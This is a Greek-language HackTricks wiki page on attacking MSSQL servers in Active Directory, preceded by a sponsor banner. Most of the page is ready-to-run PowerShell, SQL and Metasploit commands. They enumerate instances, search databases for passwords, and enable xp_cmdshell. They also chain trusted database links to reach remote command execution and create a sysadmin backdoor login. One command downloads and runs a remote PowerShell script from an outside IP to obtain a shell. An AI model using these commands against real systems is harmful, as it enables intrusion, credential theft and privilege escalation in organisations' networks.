# Κατάχρηση του MSSQL στο AD

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Απαρίθμηση / Ανακάλυψη MSSQL**

Το πρόσθετο powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) είναι πολύ χρήσιμο σε αυτήν την περίπτωση.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Απαρίθμηση από το δίκτυο χωρίς συνεδρία τομέα
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Απαρίθμηση από μέσα στον τομέα
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## Βασική Κατάχρηση MSSQL

### Πρόσβαση στη ΒΔ
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Είναι επίσης πιθανό να **εκτελέσετε εντολές** μέσα στον κεντρικό διακομιστή MSSQL
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### Βασικά Κόλπα Χάκερικής για το MSSQL

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## Εμπιστευμένοι Σύνδεσμοι MSSQL

Εάν ένα παράδειγμα MSSQL είναι εμπιστευμένο (σύνδεσμος βάσης δεδομένων) από ένα διαφορετικό παράδειγμα MSSQL. Εάν ο χρήστης έχει προνόμια στην εμπιστευμένη βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στο άλλο παράδειγμα**. Αυτές οι εμπιστοσύνες μπορούν να αλυσιδωθούν και σε κάποιο σημείο ο χρήστης ενδέχεται να βρει μια κακοδιαμορφωμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.

**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και σε εμπιστοσύνες δάση.**

### Κατάχρηση Powershell
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Μπορείτε εύκολα να ελέγξετε τους αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
### Μη αυτόματο - Openquery()

Από το **Linux** μπορείτε να αποκτήσετε ένα κέλυφος κονσόλας MSSQL με τα **sqsh** και **mssqlclient.py.**

Από τα **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **πελάτη MSSQL όπως το** [**HeidiSQL**](https://www.heidisql.com)

_Σύνδεση χρησιμοποιώντας ταυτοποίηση Windows:_

![](<../../.gitbook/assets/image (167) (1).png>) 

#### Εύρεση Αξιόπιστων Συνδέσμων
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (168).png>)

#### Εκτέλεση ερωτημάτων σε αξιόπιστο σύνδεσμο

Εκτελέστε ερωτήματα μέσω του συνδέσμου (παράδειγμα: βρείτε περισσότερους συνδέσμους στη νέα προσβάσιμη περίπτωση):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Ελέγξτε πού χρησιμοποιούνται τα διπλά και μονά εισαγωγικά, είναι σημαντικό να χρησιμοποιούνται με αυτόν τον τρόπο.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσεων επ' αόριστον χειροκίνητα.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
### Εγχειρίδιο - EXECUTE

Μπορείτε επίσης να καταχραστείτε τα αξιόπιστα συνδέσμους χρησιμοποιώντας τη μέθοδο `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Ανόρθωση Προνομίων Τοπικού Χρήστη

Ο **τοπικός χρήστης MSSQL** συνήθως έχει ένα ειδικό είδος προνομίου που ονομάζεται **`SeImpersonatePrivilege`**. Αυτό επιτρέπει στον λογαριασμό να "υποκαταστήσει έναν πελάτη μετά την πιστοποίηση".

Μια στρατηγική που πολλοί συγγραφείς έχουν σκεφτεί είναι να αναγκάσουν ένα υπηρεσία SYSTEM να πιστοποιηθεί σε μια ψεύτικη ή man-in-the-middle υπηρεσία που δημιουργεί ο επιτιθέμενος. Αυτή η ψεύτικη υπηρεσία είναι σε θέση να υποκαταστήσει την υπηρεσία SYSTEM ενώ προσπαθεί να πιστοποιηθεί.

Το [SweetPotato](https://github.com/CCob/SweetPotato) διαθέτει μια συλλογή αυτών των διαφόρων τεχνικών που μπορούν να εκτελεστούν μέσω της εντολής `execute-assembly` του Beacon.
